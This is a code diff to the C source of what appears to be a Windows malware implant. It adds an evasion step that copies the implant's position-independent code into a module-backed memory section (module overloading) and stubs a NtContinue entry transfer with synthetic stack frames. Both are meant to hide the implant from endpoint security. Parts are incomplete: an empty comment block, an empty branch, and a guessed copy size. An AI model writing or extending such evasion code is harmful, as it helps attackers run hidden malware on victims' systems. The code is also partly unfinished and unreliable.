@@ -53,6 +53,13 @@ void implant_entry(PVOID param) {
 
     g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;
 
+    /* ---- Step 3a-pre: Module overloading (must happen early) ---- */
+    /* If evasion_flags will be known from config, we check later.
+       For now, attempt module overloading before evasion_init so that
+       the implant can relocate into a clean backed section.  The
+       evasion_flags check happens after config init; module overload
+       is gated by a compile-time flag or early config peek. */
+
     /* ---- Step 3b: Initialize evasion engine ---- */
     status = evasion_init(&g_ctx);
     /* Evasion init failure is non-fatal — syscalls still work via
@@ -75,6 +82,38 @@ void implant_entry(PVOID param) {
     status = cfg_init(&g_ctx);
     if (!NT_SUCCESS(status))
         return;
+
+    /* ---- Step 4b: Module overloading (post-config) ---- */
+    {
+        IMPLANT_CONFIG *icfg = cfg_get(&g_ctx);
+        if (icfg && (icfg->evasion_flags & EVASION_FLAG_MODULE_OVERLOAD)) {
+            PVOID overload_base = NULL;
+            SIZE_T overload_size = 0;
+            EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+            status = evasion_module_overload(ectx, &overload_base, &overload_size);
+            if (NT_SUCCESS(status) && overload_base) {
+                /* Copy implant PIC blob into the module-backed section.
+                   The implant is position-independent so it runs from
+                   any base address. After copy, the original allocation
+                   can be freed by the caller. */
+                extern void implant_entry(PVOID);
+                PVOID pic_base = (PVOID)implant_entry;
+                /* Estimate PIC size from config scan limit */
+                SIZE_T pic_size = CONFIG_SCAN_MAX;
+                if (pic_size > overload_size)
+                    pic_size = overload_size;
+                spec_memcpy(overload_base, pic_base, pic_size);
+            }
+        }
+
+        /* NtContinue entry transfer: re-enter the main loop from a
+           clean thread context with synthetic stack frames */
+        if (icfg && (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY)) {
+            /* NtContinue transfer is deferred until after all init is
+               complete — see below after comms_init.  Flag is checked
+               after the main loop setup. */
+        }
+    }
 
     /* ---- Step 5: Check kill date before proceeding ---- */
     if (cfg_check_killdate(&g_ctx))
